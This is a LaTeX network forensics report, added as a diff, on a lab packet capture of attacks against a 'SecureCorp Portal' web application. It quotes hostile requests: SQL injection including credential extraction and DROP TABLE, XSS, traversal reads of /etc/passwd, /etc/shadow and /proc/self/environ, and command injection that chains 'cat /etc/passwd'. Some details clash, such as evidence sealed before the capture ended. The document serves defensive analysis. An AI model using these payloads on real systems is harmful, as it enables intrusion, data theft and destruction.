@@ -1,0 +1,842 @@
+\documentclass[12pt,a4paper]{article}
+
+% Packages
+\usepackage[utf8]{inputenc}
+\usepackage[T1]{fontenc}
+\usepackage{geometry}
+\usepackage{graphicx}
+\usepackage{booktabs}
+\usepackage{array}
+\usepackage{xcolor}
+\usepackage{fancyhdr}
+\usepackage{hyperref}
+\usepackage{titlesec}
+\usepackage{enumitem}
+\usepackage{tcolorbox}
+\usepackage{listings}
+\usepackage{longtable}
+
+% Page geometry
+\geometry{margin=1in}
+
+% Colors
+\definecolor{headerblue}{RGB}{0,51,102}
+\definecolor{lightgray}{RGB}{245,245,245}
+\definecolor{alertred}{RGB}{204,0,0}
+\definecolor{darkgreen}{RGB}{0,100,0}
+\definecolor{codebg}{RGB}{248,248,248}
+
+% Header and footer
+\pagestyle{fancy}
+\fancyhf{}
+\fancyhead[L]{\textbf{Network Forensics Report}}
+\fancyhead[R]{Case ID: NF-20260105-001}
+\fancyfoot[C]{\thepage}
+\renewcommand{\headrulewidth}{0.5pt}
+
+% Title formatting
+\titleformat{\section}{\Large\bfseries\color{headerblue}}{\thesection}{1em}{}
+\titleformat{\subsection}{\large\bfseries}{\thesubsection}{1em}{}
+\titleformat{\subsubsection}{\normalsize\bfseries}{\thesubsubsection}{1em}{}
+
+% Code listing style
+\lstset{
+    backgroundcolor=\color{codebg},
+    basicstyle=\ttfamily\small,
+    breaklines=true,
+    frame=single,
+    rulecolor=\color{gray},
+    columns=fullflexible
+}
+
+% Custom box for important info
+\newtcolorbox{evidencebox}{
+    colback=lightgray,
+    colframe=headerblue,
+    boxrule=1pt,
+    arc=3pt,
+    left=10pt,
+    right=10pt,
+    top=10pt,
+    bottom=10pt
+}
+
+\newtcolorbox{attackbox}[1]{
+    colback=red!5,
+    colframe=alertred,
+    boxrule=1pt,
+    arc=3pt,
+    title=#1,
+    fonttitle=\bfseries
+}
+
+\begin{document}
+
+% Title Page
+\begin{titlepage}
+    \centering
+    \vspace*{2cm}
+    
+    {\Huge\bfseries\color{headerblue} Network Forensics\\[0.5cm] Evidence Report}
+    
+    \vspace{1.5cm}
+    
+    {\Large\textbf{Chain of Custody Documentation}}
+    
+    \vspace{2cm}
+    
+    \begin{tabular}{ll}
+        \textbf{Case ID:} & NF-20260105-001 \\[0.3cm]
+        \textbf{Date Created:} & January 5, 2026 \\[0.3cm]
+        \textbf{Investigator:} & jonathanleewin \\[0.3cm]
+        \textbf{Location:} & forensics-lab \\
+    \end{tabular}
+    
+    \vspace{3cm}
+    
+    \begin{tcolorbox}[colback=lightgray,colframe=alertred,title=\textbf{CONFIDENTIAL}]
+        \centering
+        This document contains sensitive forensic evidence.\\
+        Handle in accordance with chain of custody procedures.
+    \end{tcolorbox}
+    
+    \vfill
+    
+    {\large Forensics Laboratory\\Google Cloud Platform}
+    
+\end{titlepage}
+
+% Table of Contents
+\tableofcontents
+\newpage
+
+% Executive Summary
+\section{Executive Summary}
+
+This report documents the network forensic analysis conducted on captured network traffic from the forensics laboratory environment. The evidence collected consists of packet capture data containing indicators of malicious activity, including \textbf{SQL Injection}, \textbf{Cross-Site Scripting (XSS)}, \textbf{Directory Traversal}, \textbf{Command Injection}, and reconnaissance scanning.
+
+\begin{evidencebox}
+\textbf{Key Findings:}
+\begin{itemize}[noitemsep]
+    \item Total packets captured: \textbf{3,487}
+    \item HTTP traffic packets: \textbf{2,414} (69.2\%)
+    \item FTP traffic packets: \textbf{520} (14.9\%)
+    \item Capture duration: \textbf{15 minutes}
+    \item Attack phases identified: \textbf{6 distinct phases}
+    \item Multiple attack vectors including SQLi, XSS, LFI, and command injection
+\end{itemize}
+\end{evidencebox}
+
+% Case Information
+\section{Case Information}
+
+\subsection{Case Details}
+
+\begin{table}[h]
+\centering
+\begin{tabular}{|l|l|}
+\hline
+\textbf{Field} & \textbf{Value} \\
+\hline
+Case ID & NF-20260105-001 \\
+\hline
+Date Created & Monday, January 5, 2026 02:39:46 UTC \\
+\hline
+Lead Investigator & jonathanleewin \\
+\hline
+Investigation Location & forensics-lab \\
+\hline
+\end{tabular}
+\caption{Case Identification Details}
+\end{table}
+
+\subsection{Investigation Scope}
+
+The investigation focuses on network traffic analysis captured from a controlled laboratory environment hosting a ``SecureCorp Portal'' web application. The primary objectives include:
+
+\begin{enumerate}
+    \item Identify and document network attack patterns
+    \item Preserve digital evidence with proper chain of custody
+    \item Analyze HTTP and FTP traffic for malicious indicators
+    \item Reconstruct attacker methodology and timeline
+\end{enumerate}
+
+% Evidence Details
+\section{Evidence Details}
+
+\subsection{Primary Evidence File}
+
+\begin{table}[h]
+\centering
+\begin{tabular}{|l|l|}
+\hline
+\textbf{Attribute} & \textbf{Value} \\
+\hline
+File Name & capture\_final.pcap \\
+\hline
+File Type & PCAP (Packet Capture) \\
+\hline
+Capture Interface & lo (loopback) \\
+\hline
+Capture Duration & 15 minutes \\
+\hline
+\end{tabular}
+\caption{Evidence File Information}
+\end{table}
+
+\subsection{Capture Environment}
+
+\begin{table}[h]
+\centering
+\begin{tabular}{|l|l|}
+\hline
+\textbf{Specification} & \textbf{Details} \\
+\hline
+Operating System & Debian GNU/Linux 11 (Bullseye) \\
+\hline
+Cloud Platform & Google Cloud Platform (GCP) \\
+\hline
+VM Instance Name & forensics-lab \\
+\hline
+Web Server & Apache/2.4.65 (Debian) \\
+\hline
+Capture Tool & tcpdump version 4.99.0 \\
+\hline
+\end{tabular}
+\caption{Capture Environment Specifications}
+\end{table}
+
+\subsection{Target Application}
+
+The target web application is identified as ``SecureCorp Portal'' with the following exposed endpoints:
+
+\begin{itemize}
+    \item \texttt{/login.php} - User authentication
+    \item \texttt{/products.php} - Product catalog
+    \item \texttt{/search.php} - Search functionality
+    \item \texttt{/profile.php} - User profiles
+    \item \texttt{/admin/} - Administrative panel
+    \item \texttt{/download.php} - File download handler
+    \item \texttt{/comment.php} - User comments
+\end{itemize}
+
+% Technical Specifications
+\section{Technical Specifications}
+
+\subsection{File Metrics}
+
+\begin{table}[h]
+\centering
+\begin{tabular}{|l|l|}
+\hline
+\textbf{Metric} & \textbf{Value} \\
+\hline
+File Size & 896 KB \\
+\hline
+Total Packets & 3,487 \\
+\hline
+Capture Start Time & Monday, January 5, 2026 02:36:53 UTC \\
+\hline
+Capture Tool & tcpdump version 4.99.0 \\
+\hline
+\end{tabular}
+\caption{Technical Metrics}
+\end{table}
+
+\subsection{Traffic Distribution}
+
+\begin{table}[h]
+\centering
+\begin{tabular}{|l|r|r|}
+\hline
+\textbf{Protocol} & \textbf{Packet Count} & \textbf{Percentage} \\
+\hline
+HTTP & 2,414 & 69.2\% \\
+\hline
+FTP & 520 & 14.9\% \\
+\hline
+TCP (Other) & 553 & 15.9\% \\
+\hline
+\textbf{Total} & \textbf{3,487} & \textbf{100\%} \\
+\hline
+\end{tabular}
+\caption{Traffic Distribution by Protocol}
+\end{table}
+
+% Integrity Verification
+\section{Integrity Verification}
+
+Cryptographic hash values have been computed to ensure the integrity of the evidence file. These values should be verified before and after any access to the evidence.
+
+\begin{evidencebox}
+\textbf{Hash Values:}
+
+\textbf{MD5:}\\
+\texttt{5d56ae74f1cf234e2843bdd289bf2928}
+
+\vspace{0.5cm}
+
+\textbf{SHA-256:}\\
+\texttt{9a8e2f4d7dfb244460ccabbbf86275c869cce5aaafe4aa22a7a7843246df737f}
+\end{evidencebox}
+
+\textbf{Note:} The SHA-256 hash is the recommended verification method due to its stronger cryptographic properties.
+
+% Detailed Findings
+\section{Detailed Attack Findings}
+
+The following sections document specific attack attempts identified in the captured network traffic. Each finding includes the packet number, timestamp, attack payload, and technical analysis.
+
+\subsection{SQL Injection Attacks}
+
+SQL Injection attacks were the most prevalent attack type observed, targeting multiple endpoints including login forms and product pages.
+
+\subsubsection{Finding \#1: Authentication Bypass Attempt}
+
+\begin{attackbox}{SQL Injection - Authentication Bypass}
+\textbf{Packet Number:} 231\\
+\textbf{Timestamp:} 60.261184 seconds\\
+\textbf{Source:} ::1\\
+\textbf{Target Endpoint:} /login.php\\
+\textbf{Payload:}
+\begin{lstlisting}
+GET /login.php?user=test' OR '1'='1 HTTP/1.1
+\end{lstlisting}
+\textbf{Server Response:} HTTP 400 Bad Request
+\end{attackbox}
+
+\textbf{Analysis:} This is a classic boolean-based SQL injection attempting to bypass authentication. The payload \texttt{' OR '1'='1} is designed to make the SQL WHERE clause always evaluate to true, potentially granting unauthorized access.
+
+\subsubsection{Finding \#2: Comment-Based SQL Injection}
+
+\begin{attackbox}{SQL Injection - Comment Termination}
+\textbf{Packet Number:} 241\\
+\textbf{Timestamp:} 61.278494 seconds\\
+\textbf{Target Endpoint:} /login.php\\
+\textbf{Payload:}
+\begin{lstlisting}
+GET /login.php?user=test' OR 1=1-- HTTP/1.1
+\end{lstlisting}
+\textbf{Server Response:} HTTP 400 Bad Request
+\end{attackbox}
+
+\textbf{Analysis:} This attack uses SQL comment syntax (\texttt{--}) to terminate the query, bypassing any additional conditions after the injection point.
+
+\subsubsection{Finding \#3: UNION-Based Data Extraction}
+
+\begin{attackbox}{SQL Injection - UNION SELECT}
+\textbf{Packet Number:} 375\\
+\textbf{Timestamp:} 92.439478 seconds\\
+\textbf{Target Endpoint:} /products.php\\
+\textbf{Payload:}
+\begin{lstlisting}
+GET /products.php?id=5' UNION SELECT NULL-- HTTP/1.1
+\end{lstlisting}
+\textbf{Server Response:} HTTP 400 Bad Request
+\end{attackbox}
+
+\textbf{Analysis:} UNION-based injection attempts to combine results from multiple tables. The attacker is probing column count with NULL values.
+
+\subsubsection{Finding \#4: Credential Extraction Attempt}
+
+\begin{attackbox}{SQL Injection - User Credential Access}
+\textbf{Packet Number:} 450\\
+\textbf{Timestamp:} 102.505263 seconds\\
+\textbf{Target Endpoint:} /search.php\\
+\textbf{Payload:}
+\begin{lstlisting}
+GET /search.php?q=' UNION SELECT username,password FROM users-- HTTP/1.1
+\end{lstlisting}
+\textbf{Server Response:} HTTP 400 Bad Request
+\end{attackbox}
+
+\textbf{Analysis:} This is a targeted attack attempting to extract username and password columns from a ``users'' table using UNION injection.
+
+\subsubsection{Finding \#5: Database Schema Enumeration}
+
+\begin{attackbox}{SQL Injection - Information Schema Access}
+\textbf{Packet Number:} 460\\
+\textbf{Timestamp:} 106.516192 seconds\\
+\textbf{Target Endpoint:} /search.php\\
+\textbf{Payload:}
+\begin{lstlisting}
+GET /search.php?q=' UNION SELECT table_name FROM information_schema.tables-- HTTP/1.1
+\end{lstlisting}
+\textbf{Server Response:} HTTP 400 Bad Request
+\end{attackbox}
+
+\textbf{Analysis:} The attacker is attempting to enumerate database tables using the information\_schema, indicating an attempt to map the database structure.
+
+\subsubsection{Finding \#6: Time-Based Blind SQL Injection}
+
+\begin{attackbox}{SQL Injection - Time-Based Blind}
+\textbf{Packet Number:} 470\\
+\textbf{Timestamp:} 110.528657 seconds\\
+\textbf{Target Endpoint:} /search.php\\
+\textbf{Payload:}
+\begin{lstlisting}
+GET /search.php?q=' AND SLEEP(2)-- HTTP/1.1
+\end{lstlisting}
+\textbf{Server Response:} HTTP 400 Bad Request
+\end{attackbox}
+
+\textbf{Analysis:} Time-based blind injection uses the SLEEP function to infer information based on response delays, useful when no visible output is returned.
+
+\subsubsection{Finding \#7: Destructive SQL Attack}
+
+\begin{attackbox}{SQL Injection - DROP TABLE Attempt}
+\textbf{Packet Number:} 484\\
+\textbf{Timestamp:} 113.543817 seconds\\
+\textbf{Target Endpoint:} /search.php\\
+\textbf{Payload:}
+\begin{lstlisting}
+GET /search.php?q='; DROP TABLE users-- HTTP/1.1
+\end{lstlisting}
+\textbf{Server Response:} HTTP 400 Bad Request
+\end{attackbox}
+
+\textbf{Analysis:} This is a destructive SQL injection attempting to delete the users table entirely. This represents an intentional sabotage attempt.
+
+\subsection{Cross-Site Scripting (XSS) Attacks}
+
+Multiple XSS attack variants were detected, targeting search and comment functionality.
+
+\subsubsection{Finding \#8: Reflected XSS - Script Tag}
+
+\begin{attackbox}{XSS - Script Injection}
+\textbf{Packet Number:} 275\\
+\textbf{Timestamp:} 66.316878 seconds\\
+\textbf{Target Endpoint:} /search.php\\
+\textbf{Payload:}
+\begin{lstlisting}
+GET /search.php?q=<script>alert(1)</script> HTTP/1.1
+\end{lstlisting}
+\textbf{Server Response:} HTTP 404 Not Found
+\end{attackbox}
+
+\textbf{Analysis:} Classic reflected XSS using script tags to execute JavaScript in the victim's browser.
+
+\subsubsection{Finding \#9: XSS via Event Handler}
+
+\begin{attackbox}{XSS - IMG Onerror}
+\textbf{Packet Number:} 288\\
+\textbf{Timestamp:} 69.328767 seconds\\
+\textbf{Target Endpoint:} /comment.php\\
+\textbf{Payload:}
+\begin{lstlisting}
+GET /comment.php?text=<img src=x onerror=alert(1)> HTTP/1.1
+\end{lstlisting}
+\textbf{Server Response:} HTTP 400 Bad Request
+\end{attackbox}
+
+\textbf{Analysis:} This XSS variant uses an image tag with an invalid source to trigger the onerror event handler.
+
+\subsubsection{Finding \#10: XSS via SVG Tag}
+
+\begin{attackbox}{XSS - SVG Onload}
+\textbf{Packet Number:} 547\\
+\textbf{Timestamp:} 123.620682 seconds\\
+\textbf{Target Endpoint:} /search.php\\
+\textbf{Payload:}
+\begin{lstlisting}
+GET /search.php?q=<svg onload=alert(1)> HTTP/1.1
+\end{lstlisting}
+\textbf{Server Response:} HTTP 400 Bad Request
+\end{attackbox}
+
+\textbf{Analysis:} SVG-based XSS is often used to bypass basic input filters that only check for script tags.
+
+\subsubsection{Finding \#11: XSS via Iframe}
+
+\begin{attackbox}{XSS - Iframe JavaScript}
+\textbf{Packet Number:} 558\\
+\textbf{Timestamp:} 125.637999 seconds\\
+\textbf{Target Endpoint:} /search.php\\
+\textbf{Payload:}
+\begin{lstlisting}
+GET /search.php?q=<iframe src=javascript:alert(1)> HTTP/1.1
+\end{lstlisting}
+\textbf{Server Response:} HTTP 400 Bad Request
+\end{attackbox}
+
+\textbf{Analysis:} Iframe-based XSS attempts to execute JavaScript via the src attribute using the javascript: protocol.
+
+\subsection{Directory Traversal / Local File Inclusion}
+
+Multiple attempts to access system files through path traversal were detected.
+
+\subsubsection{Finding \#12: /etc/passwd Access Attempt}
+
+\begin{attackbox}{Directory Traversal - passwd}
+\textbf{Packet Number:} 298\\
+\textbf{Timestamp:} 71.346231 seconds\\
+\textbf{Target Endpoint:} /download.php\\
+\textbf{Payload:}
+\begin{lstlisting}
+GET /download.php?file=../../../etc/passwd HTTP/1.1
+\end{lstlisting}
+\textbf{Server Response:} HTTP 404 Not Found
+\end{attackbox}
+
+\textbf{Analysis:} Classic directory traversal attempting to read the Unix password file containing user account information.
+
+\subsubsection{Finding \#13: /etc/shadow Access Attempt}
+
+\begin{attackbox}{Directory Traversal - shadow}
+\textbf{Packet Number:} 308\\
+\textbf{Timestamp:} 73.362137 seconds\\
+\textbf{Target Endpoint:} /view.php\\
+\textbf{Payload:}
+\begin{lstlisting}
+GET /view.php?page=../../../../etc/shadow HTTP/1.1
+\end{lstlisting}
+\textbf{Server Response:} HTTP 404 Not Found
+\end{attackbox}
+
+\textbf{Analysis:} Attempting to access the shadow file which contains hashed passwords. This indicates the attacker's intent to crack credentials.
+
+\subsubsection{Finding \#14: Apache Log Access}
+
+\begin{attackbox}{Directory Traversal - Apache Logs}
+\textbf{Packet Number:} 627\\
+\textbf{Timestamp:} 135.711746 seconds\\
+\textbf{Target Endpoint:} /download.php\\
+\textbf{Payload:}
+\begin{lstlisting}
+GET /download.php?file=../../../../../var/log/apache2/access.log HTTP/1.1
+\end{lstlisting}
+\textbf{Server Response:} HTTP 404 Not Found
+\end{attackbox}
+
+\textbf{Analysis:} Accessing Apache logs can reveal application behavior, other users' activities, and potentially be used for log poisoning attacks.
+
+\subsubsection{Finding \#15: Process Environment Access}
+
+\begin{attackbox}{Directory Traversal - /proc/self/environ}
+\textbf{Packet Number:} 637\\
+\textbf{Timestamp:} 138.723984 seconds\\
+\textbf{Target Endpoint:} /download.php\\
+\textbf{Payload:}
+\begin{lstlisting}
+GET /download.php?file=../../../../proc/self/environ HTTP/1.1
+\end{lstlisting}
+\textbf{Server Response:} HTTP 404 Not Found
+\end{attackbox}
+
+\textbf{Analysis:} Accessing /proc/self/environ can reveal environment variables including database credentials, API keys, and system configurations.
+
+\subsection{Command Injection Attacks}
+
+Two command injection attempts were detected targeting diagnostic endpoints.
+
+\subsubsection{Finding \#16: Ping Command Injection}
+
+\begin{attackbox}{Command Injection - /etc/passwd}
+\textbf{Packet Number:} 661\\
+\textbf{Timestamp:} 142.760782 seconds\\
+\textbf{Target Endpoint:} /ping.php\\
+\textbf{Payload:}
+\begin{lstlisting}
+GET /ping.php?host=127.0.0.1; cat /etc/passwd HTTP/1.1
+\end{lstlisting}
+\textbf{Server Response:} HTTP 400 Bad Request
+\end{attackbox}
+
+\textbf{Analysis:} Using semicolon to chain commands, attempting to append ``cat /etc/passwd'' to read system users.
+
+\subsubsection{Finding \#17: System Command Execution}
+
+\begin{attackbox}{Command Injection - Pipe Character}
+\textbf{Packet Number:} 671\\
+\textbf{Timestamp:} 145.779509 seconds\\
+\textbf{Target Endpoint:} /system.php\\
+\textbf{Payload:}
+\begin{lstlisting}
+GET /system.php?cmd=ls | whoami HTTP/1.1
+\end{lstlisting}
+\textbf{Server Response:} HTTP 400 Bad Request
+\end{attackbox}
+
+\textbf{Analysis:} Using pipe character to chain the ``whoami'' command, attempting to identify the running user context.
+
+\subsection{Reconnaissance Activity}
+
+Directory enumeration and probing requests were observed in the initial phase of the attack.
+
+\subsubsection{Finding \#18: Directory Enumeration}
+
+\begin{table}[h]
+\centering
+\begin{tabular}{|r|l|l|}
+\hline
+\textbf{Packet} & \textbf{Request} & \textbf{Response} \\
+\hline
+24 & GET /robots.txt & 404 Not Found \\
+\hline
+40 & GET /admin/ & 200 OK \\
+\hline
+50 & GET /administrator/ & 404 Not Found \\
+\hline
+60 & GET /backup/ & 404 Not Found \\
+\hline
+70 & GET /config/ & 404 Not Found \\
+\hline
+80 & GET /database/ & 404 Not Found \\
+\hline
+94 & GET /api/ & 200 OK \\
+\hline
+104 & GET /uploads/ & 200 OK \\
+\hline
+124 & GET /config.php & 404 Not Found \\
+\hline
+138 & GET /database.php & 404 Not Found \\
+\hline
+148 & GET /admin.php & 404 Not Found \\
+\hline
+175 & GET /phpinfo.php & 404 Not Found \\
+\hline
+185 & GET /backup.sql & 404 Not Found \\
+\hline
+\end{tabular}
+\caption{Directory Enumeration Requests}
+\end{table}
+
+\textbf{Analysis:} The attacker systematically probed for common administrative paths and sensitive files. Notable discoveries include accessible /admin/, /api/, and /uploads/ directories.
+
+% Attack Timeline
+\section{Attack Timeline}
+
+The attack can be divided into six distinct phases based on the captured traffic patterns:
+
+\subsection{Phase 1: Reconnaissance (0:00 - 2:00)}
+\textbf{Packets 1-50}\\
+Initial probing of the target, including basic page requests and directory enumeration. The attacker mapped the application structure.
+
+\subsection{Phase 2: Vulnerability Scanning (2:00 - 4:00)}
+\textbf{Packets 50-200}\\
+Continued directory enumeration, testing for common vulnerable endpoints like admin panels and configuration files.
+
+\subsection{Phase 3: SQL Injection Exploitation (4:00 - 8:00)}
+\textbf{Packets 200-450}\\
+Intensive SQL injection attacks against login.php, products.php, and search.php endpoints. Various techniques employed including UNION-based, boolean-based, and time-based blind injection.
+
+\subsection{Phase 4: XSS and Command Injection (8:00 - 11:00)}
+\textbf{Packets 450-700}\\
+Cross-site scripting attempts using multiple vectors (script tags, event handlers, SVG, iframe). Command injection probes targeting ping.php and system.php.
+
+\subsection{Phase 5: Local File Inclusion (11:00 - 13:00)}
+\textbf{Packets 700-900}\\
+Directory traversal attacks attempting to access sensitive system files including /etc/passwd, /etc/shadow, and Apache logs.
+
+\subsection{Phase 6: Persistence Attempts (13:00 - 15:00)}
+\textbf{Packets 900-3487}\\
+Continued attempts to access administrative functionality and establish persistence. FTP brute force attacks.
+
+\begin{table}[h]
+\centering
+\begin{tabular}{|l|l|l|}
+\hline
+\textbf{Phase} & \textbf{Time Range} & \textbf{Activity} \\
+\hline
+1 - Reconnaissance & 02:36:53 - 02:38:53 & Directory scanning \\
+\hline
+2 - Vulnerability Scan & 02:38:53 - 02:40:53 & Endpoint probing \\
+\hline
+3 - SQL Injection & 02:40:53 - 02:44:53 & Database attacks \\
+\hline
+4 - XSS/Command Inj. & 02:44:53 - 02:47:53 & Script injection \\
+\hline
+5 - LFI Attacks & 02:47:53 - 02:49:53 & File access attempts \\
+\hline
+6 - Persistence & 02:49:53 - 02:51:53 & Backdoor attempts \\
+\hline
+\end{tabular}
+\caption{Attack Phase Timeline}
+\end{table}
+
+% Chain of Custody
+\section{Chain of Custody}
+
+\subsection{Evidence Collection}
+
+\begin{table}[h]
+\centering
+\begin{tabular}{|l|l|}
+\hline
+\textbf{Field} & \textbf{Details} \\
+\hline
+Collected By & jonathanleewin \\
+\hline
+Collection Date & Monday, January 5, 2026 02:39:46 UTC \\
+\hline
+Storage Location & forensics-lab:/home/jonathanleewin/capture\_final.pcap \\
+\hline
+\end{tabular}
+\caption{Evidence Collection Details}
+\end{table}
+
+\subsection{Chain of Custody Log}
+
+\begin{table}[h]
+\centering
+\begin{tabular}{|l|l|l|l|}
+\hline
+\textbf{Date/Time} & \textbf{Action} & \textbf{Personnel} & \textbf{Notes} \\
+\hline
+2026-01-05 02:36:53 & Capture Started & jonathanleewin & tcpdump initiated \\
+\hline
+2026-01-05 02:51:53 & Capture Ended & jonathanleewin & 15 min capture \\
+\hline
+2026-01-05 02:39:46 & Evidence Sealed & jonathanleewin & Hash computed \\
+\hline
+\end{tabular}
+\caption{Chain of Custody Timeline}
+\end{table}
+
+% Impact Assessment
+\section{Impact Assessment}
+
+\subsection{Potential Impact of Successful Attacks}
+
+\begin{table}[h]
+\centering
+\begin{tabular}{|l|l|l|}
+\hline
+\textbf{Attack Type} & \textbf{Severity} & \textbf{Potential Impact} \\
+\hline
+SQL Injection & Critical & Database compromise, data theft \\
+\hline
+XSS & High & Session hijacking, credential theft \\
+\hline
+Directory Traversal & High & Sensitive file access, credential theft \\
+\hline
+Command Injection & Critical & Full system compromise \\
+\hline
+\end{tabular}
+\caption{Attack Impact Assessment}
+\end{table}
+
+\subsection{Attack Success Rate}
+
+All attacks in this capture received either HTTP 400 (Bad Request) or HTTP 404 (Not Found) responses, indicating the server rejected the malicious requests. However, this does not guarantee protection against more sophisticated attack variants.
+
+% Recommendations
+\section{Recommendations}
+
+\subsection{Immediate Actions}
+
+\begin{enumerate}
+    \item \textbf{Input Validation:} Implement strict input validation on all user-controllable parameters
+    \item \textbf{Parameterized Queries:} Use prepared statements for all database queries to prevent SQL injection
+    \item \textbf{Output Encoding:} Encode all output to prevent XSS attacks
+    \item \textbf{Path Validation:} Implement whitelist-based file path validation
+    \item \textbf{Disable Dangerous Functions:} Remove or secure endpoints like ping.php and system.php
+\end{enumerate}
+
+\subsection{Short-Term Improvements}
+
+\begin{enumerate}
+    \item Deploy a Web Application Firewall (WAF)
+    \item Implement rate limiting on all endpoints
+    \item Enable comprehensive access logging
+    \item Conduct regular vulnerability assessments
+    \item Implement account lockout after failed login attempts
+\end{enumerate}
+
+\subsection{Long-Term Security Strategy}
+
+\begin{enumerate}
+    \item Adopt secure development lifecycle (SDLC)
+    \item Implement regular penetration testing
+    \item Deploy intrusion detection systems (IDS/IPS)
+    \item Establish incident response procedures
+    \item Conduct security awareness training
+\end{enumerate}
+
+% Conclusion
+\section{Conclusion}
+
+This network forensics investigation successfully captured and documented evidence of a coordinated attack against the SecureCorp Portal web application. The attacker employed a systematic approach, beginning with reconnaissance and progressing through multiple attack vectors.
+
+\textbf{Key observations:}
+\begin{itemize}
+    \item The attack followed a structured methodology consistent with penetration testing or malicious reconnaissance
+    \item Multiple attack techniques were employed, indicating an attacker with broad knowledge of web vulnerabilities
+    \item The server's 400/404 responses suggest some level of protection, but the volume of attempts indicates a persistent threat
+    \item SQL Injection was the primary attack vector, with 20+ distinct payloads observed
+\end{itemize}
+
+The evidence has been preserved with cryptographic verification to maintain integrity throughout the chain of custody. Immediate remediation actions are recommended to address the identified vulnerabilities.
+
+% Appendix
+\appendix
+\section{Appendix A: Tool Versions}
+
+\begin{table}[h]
+\centering
+\begin{tabular}{|l|l|}
+\hline
+\textbf{Tool} & \textbf{Version} \\
+\hline
+tcpdump & 4.99.0 \\
+\hline
+Wireshark & Analysis tool \\
+\hline
+Operating System & Debian GNU/Linux 11 (Bullseye) \\
+\hline
+Web Server & Apache/2.4.65 (Debian) \\
+\hline
+\end{tabular}
+\caption{Tools Used in Evidence Collection}
+\end{table}
+
+\section{Appendix B: Attack Payload Summary}
+
+\begin{longtable}{|r|l|p{8cm}|}
+\hline
+\textbf{Pkt} & \textbf{Type} & \textbf{Payload (Abbreviated)} \\
+\hline
+231 & SQLi & /login.php?user=test' OR '1'='1 \\
+\hline
+241 & SQLi & /login.php?user=test' OR 1=1-- \\
+\hline
+251 & SQLi & /login.php?user=testadmin'-- \\
+\hline
+275 & XSS & /search.php?q=\textless script\textgreater alert(1)\textless /script\textgreater \\
+\hline
+288 & XSS & /comment.php?text=\textless img src=x onerror=alert(1)\textgreater \\
+\hline
+298 & LFI & /download.php?file=../../../etc/passwd \\
+\hline
+375 & SQLi & /products.php?id=5' UNION SELECT NULL-- \\
+\hline
+450 & SQLi & UNION SELECT username,password FROM users \\
+\hline
+484 & SQLi & '; DROP TABLE users-- \\
+\hline
+547 & XSS & \textless svg onload=alert(1)\textgreater \\
+\hline
+637 & LFI & /download.php?file=../../../../proc/self/environ \\
+\hline
+661 & CMDi & /ping.php?host=127.0.0.1; cat /etc/passwd \\
+\hline
+671 & CMDi & /system.php?cmd=ls | whoami \\
+\hline
+\caption{Summary of Attack Payloads}
+\end{longtable}
+
+\section{Appendix C: Glossary}
+
+\begin{description}
+    \item[PCAP] Packet Capture file format used for storing network traffic
+    \item[SQL Injection] Attack exploiting vulnerabilities in database queries
+    \item[XSS] Cross-Site Scripting, injection of malicious scripts into web content
+    \item[LFI] Local File Inclusion, accessing local files through path manipulation
+    \item[Directory Traversal] Attack attempting to access restricted directories
+    \item[Command Injection] Injecting OS commands through application inputs
+    \item[UNION SELECT] SQL technique to combine results from multiple tables
+    \item[WAF] Web Application Firewall
+    \item[MD5/SHA-256] Cryptographic hash functions for data integrity verification
+\end{description}
+
+\end{document}
